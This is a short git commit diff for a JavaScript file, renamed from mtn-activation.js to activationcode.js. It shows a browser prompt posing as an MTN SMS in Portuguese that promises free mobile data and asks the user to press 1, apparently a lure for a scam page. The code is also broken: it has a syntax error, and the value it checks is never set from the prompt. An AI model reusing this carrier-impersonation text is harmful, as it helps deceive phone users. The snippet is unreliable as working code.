1d5b08055b28f6847dfdda421cbad7740108fd35
zamonize1 <52072397+zamonize@users.noreply.github.com>
2024-06-05 14:24:15 -0700

    Update and rename mtn-activation.js to activationcode.js

--- activationcode.js
+++ activationcode.js
@@ -1,3 +1,4 @@
+
 var senha = '1'
 password=prompt('MTN SMS: Prezado cliente, por favor, verifique se o seu cartão SIM MTN está qualificado para receber de 5 GB a dados ilimitados, clientes antigos Recompensa, pressione 1 para verificar agora ','1');
 if (senha! = '1') {
